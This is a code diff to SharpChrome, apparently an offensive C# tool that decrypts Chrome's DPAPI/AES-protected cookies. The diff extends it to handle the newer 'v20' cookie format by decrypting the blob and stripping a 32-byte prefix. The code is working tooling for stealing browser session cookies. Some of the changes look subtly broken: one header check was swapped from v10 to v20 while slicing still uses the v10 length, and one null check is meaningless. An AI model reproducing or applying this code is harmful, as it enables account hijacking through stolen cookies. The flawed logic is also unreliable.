@@ -17,6 +17,7 @@ namespace SharpChrome
     {
         internal static byte[] DPAPI_HEADER = UTF8Encoding.UTF8.GetBytes("DPAPI");
         internal static byte[] DPAPI_CHROME_UNKV10 = UTF8Encoding.UTF8.GetBytes("v10");
+        internal static byte[] DPAPI_CHROME_UNKV20 = UTF8Encoding.UTF8.GetBytes("v20");
         internal const int AES_BLOCK_SIZE = 16;
 
         // approach adapted from @djhohnstein's https://github.com/djhohnstein/SharpChrome/ project
@@ -568,16 +569,42 @@ namespace SharpChrome
             {
                 try
                 {
+                    byte[] decodedBytes = null;
                     byte[] decBytes = null;
 
                     // decrypt the encrypted cookie value with whatever data/method is specified
                     byte[] valueBytes = (byte[])row.column[6].Value;
-
-                    if (HasV10Header(valueBytes))
+                    
+                    // New v20 header option 
+                    if (HasV20Header(valueBytes))
                     {
                         if (aesStateKey != null)
                         {
                             // using the new DPAPI decryption method
+                            decodedBytes = DecryptAESChromeBlob(valueBytes, hAlg, hKey);
+                            //decBytes = DecryptAESChromeBlob(valueBytes, hAlg, hKey);
+
+                            // Cut the first 32 bytes off (Program files path)
+                            int lengthToCopy = decodedBytes.Length - 32;
+                            decBytes = new byte[lengthToCopy];
+                            Array.Copy(decodedBytes, 32, decBytes, 0, lengthToCopy);
+                           
+                            if (decBytes == null)
+                            {
+                                continue;
+                            }
+                        }
+                        else
+                        {
+                            decBytes = Encoding.ASCII.GetBytes(String.Format("AES State Key Needed"));
+                        }
+                    }
+                    else if (HasV10Header(valueBytes))
+                    {
+                        if (aesStateKey != null)
+                        {
+                            // using the new DPAPI decryption method
+                            Console.WriteLine("v10 Cookie Header found!");
                             decBytes = DecryptAESChromeBlob(valueBytes, hAlg, hKey);
 
                             if (decBytes == null)
@@ -936,7 +963,7 @@ namespace SharpChrome
 
             unsafe
             {
-                if (SharpDPAPI.Helpers.ByteArrayEquals(dwData, 0, DPAPI_CHROME_UNKV10, 0, 3))
+                if (SharpDPAPI.Helpers.ByteArrayEquals(dwData, 0, DPAPI_CHROME_UNKV20, 0, 3))
                 {
                     subArrayNoV10 = new byte[dwData.Length - DPAPI_CHROME_UNKV10.Length];
                     Array.Copy(dwData, 3, subArrayNoV10, 0, dwData.Length - DPAPI_CHROME_UNKV10.Length);
@@ -984,6 +1011,10 @@ namespace SharpChrome
         public static bool HasV10Header(byte[] data)
         {
             return SharpDPAPI.Helpers.ByteArrayEquals(data, 0, DPAPI_CHROME_UNKV10, 0, 3);
+        }
+        public static bool HasV20Header(byte[] data)
+        {
+            return SharpDPAPI.Helpers.ByteArrayEquals(data, 0, DPAPI_CHROME_UNKV20, 0, 3);
         }
     }
 }
